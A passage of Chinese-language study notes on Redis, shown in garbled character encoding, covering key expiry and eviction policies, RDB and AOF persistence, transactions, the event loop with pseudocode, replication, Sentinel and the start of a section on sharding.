<p>å¯¹äºæ•£åˆ—è¡¨è¿™ç§å®¹å™¨ï¼Œåªèƒ½ä¸ºæ•´ä¸ªé”®è®¾ç½®è¿‡æœŸæ—¶é—´ï¼ˆæ•´ä¸ªæ•£åˆ—è¡¨ï¼‰ï¼Œè€Œä¸èƒ½ä¸ºé”®é‡Œé¢çš„å•ä¸ªå…ƒç´ è®¾ç½®è¿‡æœŸæ—¶é—´ã€‚</p>
<h2 id="åˆ é™¤ç­–ç•¥" tabindex="-1"> åˆ é™¤ç­–ç•¥</h2>
<table>
<thead>
<tr>
<th>åˆ é™¤ç­–ç•¥</th>
<th>å¯¹æ¯”ç»“æœ</th>
</tr>
</thead>
<tbody>
<tr>
<td>å®šæ—¶åˆ é™¤</td>
<td>1.èŠ‚çº¦å†…å­˜,æ— å ç”¨ 2.ä¸åˆ†æ—¶æ®µå ç”¨CPUèµ„æº,é¢‘åº¦é«˜ 3.æ‹¿æ—¶é—´æ¢ç©ºé—´</td>
</tr>
<tr>
<td>æƒ°æ€§åˆ é™¤</td>
<td>1.å†…å­˜å ç”¨ä¸¥é‡ 2.å»¶æ—¶æ‰§è¡Œ,CPUåˆ©ç”¨ç‡é«˜ 3.æ‹¿ç©ºé—´æ¢æ—¶é—´</td>
</tr>
<tr>
<td>å®šæœŸåˆ é™¤</td>
<td>1.å†…å­˜å®šæœŸéšæœºæ¸…ç† 2.æ¯ç§’èŠ±è´¹å›ºå®šçš„CPUèµ„æºç»´æŠ¤å†…å­˜ 3.éšæœºæŠ½æŸ¥,é‡ç‚¹æŠ½æŸ¥</td>
</tr>
</tbody>
</table>
<p>Redis é‡‡ç”¨çš„æ˜¯ å®šæœŸåˆ é™¤+æƒ°æ€§/æ‡’æ±‰å¼åˆ é™¤</p>
<p>ä»…ä»…é€šè¿‡ç»™ key è®¾ç½®è¿‡æœŸæ—¶é—´è¿˜æ˜¯æœ‰é—®é¢˜çš„ã€‚å› ä¸ºè¿˜æ˜¯å¯èƒ½å­˜åœ¨å®šæœŸåˆ é™¤å’Œæƒ°æ€§åˆ é™¤æ¼æ‰äº†å¾ˆå¤šè¿‡æœŸ key çš„æƒ…å†µã€‚è¿™æ ·å°±å¯¼è‡´å¤§é‡è¿‡æœŸ key å †ç§¯åœ¨å†…å­˜é‡Œï¼Œç„¶åå°±Out of memoryäº†ã€‚</p>
<p>æ€ä¹ˆè§£å†³è¿™ä¸ªé—®é¢˜å‘¢ï¼Ÿç­”æ¡ˆå°±æ˜¯ï¼š Redis å†…å­˜æ·˜æ±°æœºåˆ¶ã€‚</p>
<h1 id="å…­ã€æ•°æ®æ·˜æ±°ç­–ç•¥" tabindex="-1"> å…­ã€æ•°æ®æ·˜æ±°ç­–ç•¥</h1>
<p>å¯ä»¥è®¾ç½®å†…å­˜æœ€å¤§ä½¿ç”¨é‡ï¼Œå½“å†…å­˜ä½¿ç”¨é‡è¶…å‡ºæ—¶ï¼Œä¼šæ–½è¡Œæ•°æ®æ·˜æ±°ç­–ç•¥ã€‚</p>
<p>Redis å…·ä½“æœ‰ 6 ç§æ·˜æ±°ç­–ç•¥ï¼š</p>
<table>
<thead>
<tr>
<th style="text-align:center">ç­–ç•¥</th>
<th style="text-align:center">æè¿°</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">volatile-lru</td>
<td style="text-align:center">ä»å·²è®¾ç½®è¿‡æœŸæ—¶é—´çš„æ•°æ®é›†ä¸­æŒ‘é€‰æœ€è¿‘æœ€å°‘ä½¿ç”¨çš„æ•°æ®æ·˜æ±°</td>
</tr>
<tr>
<td style="text-align:center">volatile-ttl</td>
<td style="text-align:center">ä»å·²è®¾ç½®è¿‡æœŸæ—¶é—´çš„æ•°æ®é›†ä¸­æŒ‘é€‰å°†è¦è¿‡æœŸçš„æ•°æ®æ·˜æ±°</td>
</tr>
<tr>
<td style="text-align:center">volatile-random</td>
<td style="text-align:center">ä»å·²è®¾ç½®è¿‡æœŸæ—¶é—´çš„æ•°æ®é›†ä¸­ä»»æ„é€‰æ‹©æ•°æ®æ·˜æ±°</td>
</tr>
<tr>
<td style="text-align:center">allkeys-lru</td>
<td style="text-align:center">ä»æ‰€æœ‰æ•°æ®é›†ä¸­æŒ‘é€‰æœ€è¿‘æœ€å°‘ä½¿ç”¨çš„æ•°æ®æ·˜æ±°</td>
</tr>
<tr>
<td style="text-align:center">allkeys-random</td>
<td style="text-align:center">ä»æ‰€æœ‰æ•°æ®é›†ä¸­ä»»æ„é€‰æ‹©æ•°æ®è¿›è¡Œæ·˜æ±°</td>
</tr>
<tr>
<td style="text-align:center">noeviction</td>
<td style="text-align:center">ç¦æ­¢é©±é€æ•°æ®</td>
</tr>
</tbody>
</table>
<p>ä½œä¸ºå†…å­˜æ•°æ®åº“ï¼Œå‡ºäºå¯¹æ€§èƒ½å’Œå†…å­˜æ¶ˆè€—çš„è€ƒè™‘ï¼ŒRedis çš„æ·˜æ±°ç®—æ³•å®é™…å®ç°ä¸Šå¹¶éé’ˆå¯¹æ‰€æœ‰ keyï¼Œè€Œæ˜¯æŠ½æ ·ä¸€å°éƒ¨åˆ†å¹¶ä¸”ä»ä¸­é€‰å‡ºè¢«æ·˜æ±°çš„ keyã€‚</p>
<p>ä½¿ç”¨ Redis ç¼“å­˜æ•°æ®æ—¶ï¼Œä¸ºäº†æé«˜ç¼“å­˜å‘½ä¸­ç‡ï¼Œéœ€è¦ä¿è¯ç¼“å­˜æ•°æ®éƒ½æ˜¯çƒ­ç‚¹æ•°æ®ã€‚å¯ä»¥å°†å†…å­˜æœ€å¤§ä½¿ç”¨é‡è®¾ç½®ä¸ºçƒ­ç‚¹æ•°æ®å ç”¨çš„å†…å­˜é‡ï¼Œç„¶åå¯ç”¨ allkeys-lru æ·˜æ±°ç­–ç•¥ï¼Œå°†æœ€è¿‘æœ€å°‘ä½¿ç”¨çš„æ•°æ®æ·˜æ±°ã€‚</p>
<p>Redis 4.0 å¼•å…¥äº† volatile-lfu å’Œ allkeys-lfu æ·˜æ±°ç­–ç•¥ï¼ŒLFU ç­–ç•¥é€šè¿‡ç»Ÿè®¡è®¿é—®é¢‘ç‡ï¼Œå°†è®¿é—®é¢‘ç‡æœ€å°‘çš„é”®å€¼å¯¹æ·˜æ±°ã€‚</p>
<h1 id="ä¸ƒã€æŒä¹…åŒ–" tabindex="-1"> ä¸ƒã€æŒä¹…åŒ–</h1>
<p>Redis æ˜¯å†…å­˜å‹æ•°æ®åº“ï¼Œä¸ºäº†ä¿è¯æ•°æ®åœ¨æ–­ç”µåä¸ä¼šä¸¢å¤±ï¼Œéœ€è¦å°†å†…å­˜ä¸­çš„æ•°æ®æŒä¹…åŒ–åˆ°ç¡¬ç›˜ä¸Šã€‚</p>
<h2 id="rdb-æŒä¹…åŒ–-å…¨é‡æ¨¡å¼æŒä¹…åŒ–" tabindex="-1"> RDB æŒä¹…åŒ– å…¨é‡æ¨¡å¼æŒä¹…åŒ–</h2>
<p>å°†æŸä¸ªæ—¶é—´ç‚¹çš„æ‰€æœ‰æ•°æ®éƒ½å­˜æ”¾åˆ°ç¡¬ç›˜ä¸Šã€‚</p>
<p>å¯ä»¥å°†å¿«ç…§å¤åˆ¶åˆ°å…¶å®ƒæœåŠ¡å™¨ä»è€Œåˆ›å»ºå…·æœ‰ç›¸åŒæ•°æ®çš„æœåŠ¡å™¨å‰¯æœ¬ã€‚</p>
<p>å¦‚æœç³»ç»Ÿå‘ç”Ÿæ•…éšœï¼Œå°†ä¼šä¸¢å¤±æœ€åä¸€æ¬¡åˆ›å»ºå¿«ç…§ä¹‹åçš„æ•°æ®ã€‚</p>
<p>å¦‚æœæ•°æ®é‡å¾ˆå¤§ï¼Œä¿å­˜å¿«ç…§çš„æ—¶é—´ä¼šå¾ˆé•¿ã€‚</p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-17-24-38.png" alt="" title=":size=500" loading="lazy"></p>
<h2 id="aof-æŒä¹…åŒ–-å¢é‡æ¨¡å¼æŒä¹…åŒ–" tabindex="-1"> AOF æŒä¹…åŒ– å¢é‡æ¨¡å¼æŒä¹…åŒ–</h2>
<p>å°†å†™å‘½ä»¤æ·»åŠ åˆ° AOF æ–‡ä»¶ï¼ˆAppend Only Fileï¼‰çš„æœ«å°¾ã€‚</p>
<p>ä½¿ç”¨ AOF æŒä¹…åŒ–éœ€è¦è®¾ç½®åŒæ­¥é€‰é¡¹ï¼Œä»è€Œç¡®ä¿å†™å‘½ä»¤åŒæ­¥åˆ°ç£ç›˜æ–‡ä»¶ä¸Šçš„æ—¶æœºã€‚è¿™æ˜¯å› ä¸ºå¯¹æ–‡ä»¶è¿›è¡Œå†™å…¥å¹¶ä¸ä¼šé©¬ä¸Šå°†å†…å®¹åŒæ­¥åˆ°ç£ç›˜ä¸Šï¼Œè€Œæ˜¯å…ˆå­˜å‚¨åˆ°ç¼“å†²åŒºï¼Œç„¶åç”±æ“ä½œç³»ç»Ÿå†³å®šä»€ä¹ˆæ—¶å€™åŒæ­¥åˆ°ç£ç›˜ã€‚æœ‰ä»¥ä¸‹åŒæ­¥é€‰é¡¹ï¼š</p>
<table>
<thead>
<tr>
<th style="text-align:center">é€‰é¡¹</th>
<th style="text-align:center">åŒæ­¥é¢‘ç‡</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">always</td>
<td style="text-align:center">æ¯ä¸ªå†™å‘½ä»¤éƒ½åŒæ­¥</td>
</tr>
<tr>
<td style="text-align:center">everysec</td>
<td style="text-align:center">æ¯ç§’åŒæ­¥ä¸€æ¬¡</td>
</tr>
<tr>
<td style="text-align:center">no</td>
<td style="text-align:center">è®©æ“ä½œç³»ç»Ÿæ¥å†³å®šä½•æ—¶åŒæ­¥</td>
</tr>
</tbody>
</table>
<ul>
<li>always é€‰é¡¹ä¼šä¸¥é‡å‡ä½æœåŠ¡å™¨çš„æ€§èƒ½ï¼›</li>
<li>everysec é€‰é¡¹æ¯”è¾ƒåˆé€‚ï¼Œå¯ä»¥ä¿è¯ç³»ç»Ÿå´©æºƒæ—¶åªä¼šä¸¢å¤±ä¸€ç§’å·¦å³çš„æ•°æ®ï¼Œå¹¶ä¸” Redis æ¯ç§’æ‰§è¡Œä¸€æ¬¡åŒæ­¥å¯¹æœåŠ¡å™¨æ€§èƒ½å‡ ä¹æ²¡æœ‰ä»»ä½•å½±å“ï¼›</li>
<li>no é€‰é¡¹å¹¶ä¸èƒ½ç»™æœåŠ¡å™¨æ€§èƒ½å¸¦æ¥å¤šå¤§çš„æå‡ï¼Œè€Œä¸”ä¹Ÿä¼šå¢åŠ ç³»ç»Ÿå´©æºƒæ—¶æ•°æ®ä¸¢å¤±çš„æ•°é‡ã€‚</li>
</ul>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-17-24-26.png" alt="" title=":size=500" loading="lazy"></p>
<p>éšç€æœåŠ¡å™¨å†™è¯·æ±‚çš„å¢å¤šï¼ŒAOF æ–‡ä»¶ä¼šè¶Šæ¥è¶Šå¤§ã€‚Redis æä¾›äº†ä¸€ç§å°† AOF é‡å†™çš„ç‰¹æ€§ï¼Œèƒ½å¤Ÿå»é™¤ AOF æ–‡ä»¶ä¸­çš„å†—ä½™å†™å‘½ä»¤ã€‚</p>
<p>AOF é‡å†™å¯ä»¥äº§ç”Ÿä¸€ä¸ªæ–°çš„ AOF æ–‡ä»¶ï¼Œè¿™ä¸ªæ–°çš„ AOF æ–‡ä»¶å’ŒåŸæœ‰çš„ AOF æ–‡ä»¶æ‰€ä¿å­˜çš„æ•°æ®åº“çŠ¶æ€ä¸€æ ·ï¼Œä½†ä½“ç§¯æ›´å°ã€‚</p>
<p>AOF é‡å†™æ˜¯ä¸€ä¸ªæœ‰æ­§ä¹‰çš„åå­—ï¼Œè¯¥åŠŸèƒ½æ˜¯é€šè¿‡è¯»å–æ•°æ®åº“ä¸­çš„é”®å€¼å¯¹æ¥å®ç°çš„ï¼Œç¨‹åºæ— é¡»å¯¹ç°æœ‰ AOF æ–‡ä»¶è¿›è¡Œä»»ä½•è¯»å…¥ã€åˆ†ææˆ–è€…å†™å…¥æ“ä½œã€‚</p>
<p>åœ¨æ‰§è¡Œ BGREWRITEAOF å‘½ä»¤æ—¶ï¼ŒRedis æœåŠ¡å™¨ä¼šç»´æŠ¤ä¸€ä¸ª AOF é‡å†™ç¼“å†²åŒºï¼Œè¯¥ç¼“å†²åŒºä¼šåœ¨å­è¿›ç¨‹åˆ›å»ºæ–° AOF æ–‡ä»¶æœŸé—´ï¼Œè®°å½•æœåŠ¡å™¨æ‰§è¡Œçš„æ‰€æœ‰å†™å‘½ä»¤ã€‚å½“å­è¿›ç¨‹å®Œæˆåˆ›å»ºæ–° AOF æ–‡ä»¶çš„å·¥ä½œä¹‹åï¼ŒæœåŠ¡å™¨ä¼šå°†é‡å†™ç¼“å†²åŒºä¸­çš„æ‰€æœ‰å†…å®¹è¿½åŠ åˆ°æ–° AOF æ–‡ä»¶çš„æœ«å°¾ï¼Œä½¿å¾—æ–°æ—§ä¸¤ä¸ª AOF æ–‡ä»¶æ‰€ä¿å­˜çš„æ•°æ®åº“çŠ¶æ€ä¸€è‡´ã€‚æœ€åï¼ŒæœåŠ¡å™¨ç”¨æ–°çš„ AOF æ–‡ä»¶æ›¿æ¢æ—§çš„ AOF æ–‡ä»¶ï¼Œä»¥æ­¤æ¥å®Œæˆ AOF æ–‡ä»¶é‡å†™æ“ä½œ</p>
<h1 id="å…«ã€äº‹åŠ¡" tabindex="-1"> å…«ã€äº‹åŠ¡</h1>
<p>ä¸€ä¸ªäº‹åŠ¡åŒ…å«äº†å¤šä¸ªå‘½ä»¤ï¼ŒæœåŠ¡å™¨åœ¨æ‰§è¡Œäº‹åŠ¡æœŸé—´ï¼Œä¸ä¼šæ”¹å»æ‰§è¡Œå…¶å®ƒå®¢æˆ·ç«¯çš„å‘½ä»¤è¯·æ±‚ã€‚</p>
<p>äº‹åŠ¡ä¸­çš„å¤šä¸ªå‘½ä»¤è¢«ä¸€æ¬¡æ€§å‘é€ç»™æœåŠ¡å™¨ï¼Œè€Œä¸æ˜¯ä¸€æ¡ä¸€æ¡å‘é€ï¼Œè¿™ç§æ–¹å¼è¢«ç§°ä¸ºæµæ°´çº¿ï¼Œå®ƒå¯ä»¥å‡å°‘å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨ä¹‹é—´çš„ç½‘ç»œé€šä¿¡æ¬¡æ•°ä»è€Œæå‡æ€§èƒ½ã€‚</p>
<p>Redis æœ€ç®€å•çš„äº‹åŠ¡å®ç°æ–¹å¼æ˜¯ä½¿ç”¨ MULTI å’Œ EXEC å‘½ä»¤å°†äº‹åŠ¡æ“ä½œåŒ…å›´èµ·æ¥ã€‚</p>
<h1 id="ä¹ã€äº‹ä»¶" tabindex="-1"> ä¹ã€äº‹ä»¶</h1>
<p>Redis æœåŠ¡å™¨æ˜¯ä¸€ä¸ªäº‹ä»¶é©±åŠ¨ç¨‹åºã€‚</p>
<h2 id="æ–‡ä»¶äº‹ä»¶" tabindex="-1"> æ–‡ä»¶äº‹ä»¶</h2>
<p>æœåŠ¡å™¨é€šè¿‡å¥—æ¥å­—ä¸å®¢æˆ·ç«¯æˆ–è€…å…¶å®ƒæœåŠ¡å™¨è¿›è¡Œé€šä¿¡ï¼Œæ–‡ä»¶äº‹ä»¶å°±æ˜¯å¯¹å¥—æ¥å­—æ“ä½œçš„æŠ½è±¡ã€‚</p>
<p>Redis åŸºäº Reactor æ¨¡å¼å¼€å‘äº†è‡ªå·±çš„ç½‘ç»œäº‹ä»¶å¤„ç†å™¨ï¼Œä½¿ç”¨ I/O å¤šè·¯å¤ç”¨ç¨‹åºæ¥åŒæ—¶ç›‘å¬å¤šä¸ªå¥—æ¥å­—ï¼Œå¹¶å°†åˆ°è¾¾çš„äº‹ä»¶ä¼ é€ç»™æ–‡ä»¶äº‹ä»¶åˆ†æ´¾å™¨ï¼Œåˆ†æ´¾å™¨ä¼šæ ¹æ®å¥—æ¥å­—äº§ç”Ÿçš„äº‹ä»¶ç±»å‹è°ƒç”¨ç›¸åº”çš„äº‹ä»¶å¤„ç†å™¨ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/9ea86eb5-000a-4281-b948-7b567bd6f1d8.png" width=""/> </div><br>
<p>æ³¨æ„ï¼ Redis 6.0 ä¹‹åçš„ç‰ˆæœ¬æŠ›å¼ƒäº†å•çº¿ç¨‹æ¨¡å‹è¿™ä¸€è®¾è®¡ï¼ŒåŸæœ¬ä½¿ç”¨å•çº¿ç¨‹è¿è¡Œçš„ Redis ä¹Ÿå¼€å§‹é€‰æ‹©æ€§åœ°ä½¿ç”¨å¤šçº¿ç¨‹æ¨¡å‹ã€‚</p>
<p>å‰é¢è¿˜åœ¨å¼ºè°ƒ Redis å•çº¿ç¨‹æ¨¡å‹çš„é«˜æ•ˆæ€§ï¼Œç°åœ¨ä¸ºä»€ä¹ˆåˆè¦å¼•å…¥å¤šçº¿ç¨‹ï¼Ÿè¿™å…¶å®è¯´æ˜ Redis åœ¨æœ‰äº›æ–¹é¢ï¼Œå•çº¿ç¨‹å·²ç»ä¸å…·æœ‰ä¼˜åŠ¿äº†ã€‚å› ä¸ºè¯»å†™ç½‘ç»œçš„ Read/Write ç³»ç»Ÿè°ƒç”¨åœ¨ Redis æ‰§è¡ŒæœŸé—´å ç”¨äº†å¤§éƒ¨åˆ† CPU æ—¶é—´ï¼Œå¦‚æœæŠŠç½‘ç»œè¯»å†™åšæˆå¤šçº¿ç¨‹çš„æ–¹å¼å¯¹æ€§èƒ½ä¼šæœ‰å¾ˆå¤§æå‡ã€‚</p>
<p>Redis çš„å¤šçº¿ç¨‹éƒ¨åˆ†åªæ˜¯ç”¨æ¥å¤„ç†ç½‘ç»œæ•°æ®çš„è¯»å†™å’Œåè®®è§£æï¼Œæ‰§è¡Œå‘½ä»¤ä»ç„¶æ˜¯å•çº¿ç¨‹ã€‚ ä¹‹æ‰€ä»¥è¿™ä¹ˆè®¾è®¡æ˜¯ä¸æƒ³ Redis å› ä¸ºå¤šçº¿ç¨‹è€Œå˜å¾—å¤æ‚ï¼Œéœ€è¦å»æ§åˆ¶ keyã€luaã€äº‹åŠ¡ã€LPUSH/LPOP ç­‰ç­‰çš„å¹¶å‘é—®é¢˜ã€‚</p>
<h2 id="æ—¶é—´äº‹ä»¶" tabindex="-1"> æ—¶é—´äº‹ä»¶</h2>
<p>æœåŠ¡å™¨æœ‰ä¸€äº›æ“ä½œéœ€è¦åœ¨ç»™å®šçš„æ—¶é—´ç‚¹æ‰§è¡Œï¼Œæ—¶é—´äº‹ä»¶æ˜¯å¯¹è¿™ç±»å®šæ—¶æ“ä½œçš„æŠ½è±¡ã€‚</p>
<p>æ—¶é—´äº‹ä»¶åˆåˆ†ä¸ºï¼š</p>
<ul>
<li>å®šæ—¶äº‹ä»¶ï¼šæ˜¯è®©ä¸€æ®µç¨‹åºåœ¨æŒ‡å®šçš„æ—¶é—´ä¹‹å†…æ‰§è¡Œä¸€æ¬¡ï¼›</li>
<li>å‘¨æœŸæ€§äº‹ä»¶ï¼šæ˜¯è®©ä¸€æ®µç¨‹åºæ¯éš”æŒ‡å®šæ—¶é—´å°±æ‰§è¡Œä¸€æ¬¡ã€‚</li>
</ul>
<p>Redis å°†æ‰€æœ‰æ—¶é—´äº‹ä»¶éƒ½æ”¾åœ¨ä¸€ä¸ªæ— åºé“¾è¡¨ä¸­ï¼Œé€šè¿‡éå†æ•´ä¸ªé“¾è¡¨æŸ¥æ‰¾å‡ºå·²åˆ°è¾¾çš„æ—¶é—´äº‹ä»¶ï¼Œå¹¶è°ƒç”¨ç›¸åº”çš„äº‹ä»¶å¤„ç†å™¨ã€‚</p>
<h2 id="äº‹ä»¶çš„è°ƒåº¦ä¸æ‰§è¡Œ" tabindex="-1"> äº‹ä»¶çš„è°ƒåº¦ä¸æ‰§è¡Œ</h2>
<p>æœåŠ¡å™¨éœ€è¦ä¸æ–­ç›‘å¬æ–‡ä»¶äº‹ä»¶çš„å¥—æ¥å­—æ‰èƒ½å¾—åˆ°å¾…å¤„ç†çš„æ–‡ä»¶äº‹ä»¶ï¼Œä½†æ˜¯ä¸èƒ½ä¸€ç›´ç›‘å¬ï¼Œå¦åˆ™æ—¶é—´äº‹ä»¶æ— æ³•åœ¨è§„å®šçš„æ—¶é—´å†…æ‰§è¡Œï¼Œå› æ­¤ç›‘å¬æ—¶é—´åº”è¯¥æ ¹æ®è·ç¦»ç°åœ¨æœ€è¿‘çš„æ—¶é—´äº‹ä»¶æ¥å†³å®šã€‚</p>
<p>äº‹ä»¶è°ƒåº¦ä¸æ‰§è¡Œç”± aeProcessEvents å‡½æ•°è´Ÿè´£ï¼Œä¼ªä»£ç å¦‚ä¸‹ï¼š</p>
<div><pre><code><span>def</span> <span>aeProcessEvents</span><span>(</span><span>)</span><span>:</span>
    <span># è·å–åˆ°è¾¾æ—¶é—´ç¦»å½“å‰æ—¶é—´æœ€æ¥è¿‘çš„æ—¶é—´äº‹ä»¶</span>
    time_event <span>=</span> aeSearchNearestTimer<span>(</span><span>)</span>
    <span># è®¡ç®—æœ€æ¥è¿‘çš„æ—¶é—´äº‹ä»¶è·ç¦»åˆ°è¾¾è¿˜æœ‰å¤šå°‘æ¯«ç§’</span>
    remaind_ms <span>=</span> time_event<span>.</span>when <span>-</span> unix_ts_now<span>(</span><span>)</span>
    <span># å¦‚æœäº‹ä»¶å·²åˆ°è¾¾ï¼Œé‚£ä¹ˆ remaind_ms çš„å€¼å¯èƒ½ä¸ºè´Ÿæ•°ï¼Œå°†å®ƒè®¾ä¸º 0</span>
    <span>if</span> remaind_ms <span>&lt;</span> <span>0</span><span>:</span>
        remaind_ms <span>=</span> <span>0</span>
    <span># æ ¹æ® remaind_ms çš„å€¼ï¼Œåˆ›å»º timeval</span>
    timeval <span>=</span> create_timeval_with_ms<span>(</span>remaind_ms<span>)</span>
    <span># é˜»å¡å¹¶ç­‰å¾…æ–‡ä»¶äº‹ä»¶äº§ç”Ÿï¼Œæœ€å¤§é˜»å¡æ—¶é—´ç”±ä¼ å…¥çš„ timeval å†³å®š</span>
    aeApiPoll<span>(</span>timeval<span>)</span>
    <span># å¤„ç†æ‰€æœ‰å·²äº§ç”Ÿçš„æ–‡ä»¶äº‹ä»¶</span>
    procesFileEvents<span>(</span><span>)</span>
    <span># å¤„ç†æ‰€æœ‰å·²åˆ°è¾¾çš„æ—¶é—´äº‹ä»¶</span>
    processTimeEvents<span>(</span><span>)</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br></div></div><p>å°† aeProcessEvents å‡½æ•°ç½®äºä¸€ä¸ªå¾ªç¯é‡Œé¢ï¼ŒåŠ ä¸Šåˆå§‹åŒ–å’Œæ¸…ç†å‡½æ•°ï¼Œå°±æ„æˆäº† Redis æœåŠ¡å™¨çš„ä¸»å‡½æ•°ï¼Œä¼ªä»£ç å¦‚ä¸‹ï¼š</p>
<div><pre><code><span>def</span> <span>main</span><span>(</span><span>)</span><span>:</span>
    <span># åˆå§‹åŒ–æœåŠ¡å™¨</span>
    init_server<span>(</span><span>)</span>
    <span># ä¸€ç›´å¤„ç†äº‹ä»¶ï¼Œç›´åˆ°æœåŠ¡å™¨å…³é—­ä¸ºæ­¢</span>
    <span>while</span> server_is_not_shutdown<span>(</span><span>)</span><span>:</span>
        aeProcessEvents<span>(</span><span>)</span>
    <span># æœåŠ¡å™¨å…³é—­ï¼Œæ‰§è¡Œæ¸…ç†æ“ä½œ</span>
    clean_server<span>(</span><span>)</span>
</code></pre></div><p>ä»äº‹ä»¶å¤„ç†çš„è§’åº¦æ¥çœ‹ï¼ŒæœåŠ¡å™¨è¿è¡Œæµç¨‹å¦‚ä¸‹ï¼š</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/c0a9fa91-da2e-4892-8c9f-80206a6f7047.png" width="350"/> </div><br>
<h1 id="åã€å¤åˆ¶" tabindex="-1"> åã€å¤åˆ¶</h1>
<p>é€šè¿‡ä½¿ç”¨ slaveof host port å‘½ä»¤æ¥è®©ä¸€ä¸ªæœåŠ¡å™¨æˆä¸ºå¦ä¸€ä¸ªæœåŠ¡å™¨çš„ä»æœåŠ¡å™¨ã€‚</p>
<p>ä¸€ä¸ªä»æœåŠ¡å™¨åªèƒ½æœ‰ä¸€ä¸ªä¸»æœåŠ¡å™¨ï¼Œå¹¶ä¸”ä¸æ”¯æŒä¸»ä¸»å¤åˆ¶ã€‚</p>
<h2 id="è¿æ¥è¿‡ç¨‹" tabindex="-1"> è¿æ¥è¿‡ç¨‹</h2>
<ol>
<li>
<p>ä¸»æœåŠ¡å™¨åˆ›å»ºå¿«ç…§æ–‡ä»¶ï¼Œå‘é€ç»™ä»æœåŠ¡å™¨ï¼Œå¹¶åœ¨å‘é€æœŸé—´ä½¿ç”¨ç¼“å†²åŒºè®°å½•æ‰§è¡Œçš„å†™å‘½ä»¤ã€‚å¿«ç…§æ–‡ä»¶å‘é€å®Œæ¯•ä¹‹åï¼Œå¼€å§‹å‘ä»æœåŠ¡å™¨å‘é€å­˜å‚¨åœ¨ç¼“å†²åŒºä¸­çš„å†™å‘½ä»¤ï¼›</p>
</li>
<li>
<p>ä»æœåŠ¡å™¨ä¸¢å¼ƒæ‰€æœ‰æ—§æ•°æ®ï¼Œè½½å…¥ä¸»æœåŠ¡å™¨å‘æ¥çš„å¿«ç…§æ–‡ä»¶ï¼Œä¹‹åä»æœåŠ¡å™¨å¼€å§‹æ¥å—ä¸»æœåŠ¡å™¨å‘æ¥çš„å†™å‘½ä»¤ï¼›</p>
</li>
<li>
<p>ä¸»æœåŠ¡å™¨æ¯æ‰§è¡Œä¸€æ¬¡å†™å‘½ä»¤ï¼Œå°±å‘ä»æœåŠ¡å™¨å‘é€ç›¸åŒçš„å†™å‘½ä»¤ã€‚</p>
</li>
</ol>
<h2 id="ä¸»ä»é“¾" tabindex="-1"> ä¸»ä»é“¾</h2>
<p>éšç€è´Ÿè½½ä¸æ–­ä¸Šå‡ï¼Œä¸»æœåŠ¡å™¨å¯èƒ½æ— æ³•å¾ˆå¿«åœ°æ›´æ–°æ‰€æœ‰ä»æœåŠ¡å™¨ï¼Œæˆ–è€…é‡æ–°è¿æ¥å’Œé‡æ–°åŒæ­¥ä»æœåŠ¡å™¨å°†å¯¼è‡´ç³»ç»Ÿè¶…è½½ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå¯ä»¥åˆ›å»ºä¸€ä¸ªä¸­é—´å±‚æ¥åˆ†æ‹…ä¸»æœåŠ¡å™¨çš„å¤åˆ¶å·¥ä½œã€‚ä¸­é—´å±‚çš„æœåŠ¡å™¨æ˜¯æœ€ä¸Šå±‚æœåŠ¡å™¨çš„ä»æœåŠ¡å™¨ï¼Œåˆæ˜¯æœ€ä¸‹å±‚æœåŠ¡å™¨çš„ä¸»æœåŠ¡å™¨ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/395a9e83-b1a1-4a1d-b170-d081e7bb5bab.png" width="600"/> </div><br>
<h1 id="åä¸€ã€sentinel" tabindex="-1"> åä¸€ã€Sentinel</h1>
<p>Sentinelï¼ˆå“¨å…µï¼‰å¯ä»¥ç›‘å¬é›†ç¾¤ä¸­çš„æœåŠ¡å™¨ï¼Œå¹¶åœ¨ä¸»æœåŠ¡å™¨è¿›å…¥ä¸‹çº¿çŠ¶æ€æ—¶ï¼Œè‡ªåŠ¨ä»ä»æœåŠ¡å™¨ä¸­é€‰ä¸¾å‡ºæ–°çš„ä¸»æœåŠ¡å™¨ã€‚</p>
<h1 id="åäºŒã€åˆ†ç‰‡" tabindex="-1"> åäºŒã€åˆ†ç‰‡</h1>
<p>åˆ†ç‰‡æ˜¯å°†æ•°æ®åˆ’åˆ†ä¸ºå¤šä¸ªéƒ¨åˆ†çš„æ–¹æ³•ï¼Œå¯ä»¥å°†æ•°æ®å­˜å‚¨åˆ°å¤šå°æœºå™¨é‡Œé¢ï¼Œè¿™ç§æ–¹æ³•åœ¨è§£å†³æŸäº›é—®é¢˜æ—¶å¯ä»¥è·å¾—çº¿æ€§çº§åˆ«çš„æ€§èƒ½æå‡ã€‚</p>
<p>å‡è®¾æœ‰ 4 ä¸ª Redis å®ä¾‹ R0ï¼ŒR1ï¼ŒR2ï¼ŒR3ï¼Œè¿˜æœ‰å¾ˆå¤šè¡¨ç¤ºç”¨æˆ·çš„é”® user:1ï¼Œuser:2ï¼Œ... ï¼Œæœ‰ä¸åŒçš„æ–¹å¼æ¥é€‰æ‹©ä¸€ä¸ªæŒ‡å®šçš„é”®å­˜å‚¨åœ¨å“ªä¸ªå®ä¾‹ä¸­ã€‚</p>
<ul>
<li>æœ€ç®€å•çš„æ–¹å¼æ˜¯èŒƒå›´åˆ†ç‰‡ï¼Œä¾‹å¦‚ç”¨æˆ· id ä» 0~1000 çš„å­˜å‚¨åˆ°å®ä¾‹ R0 ä¸­ï¼Œç”¨æˆ· id ä» 1001~2000 çš„å­˜å‚¨åˆ°å®ä¾‹ R1 ä¸­ï¼Œç­‰ç­‰ã€‚ä½†æ˜¯è¿™æ ·éœ€è¦ç»´æŠ¤ä¸€å¼ æ˜ å°„èŒƒå›´è¡¨ï¼Œç»´æŠ¤æ“ä½œä»£ä»·å¾ˆé«˜ã€‚</li>
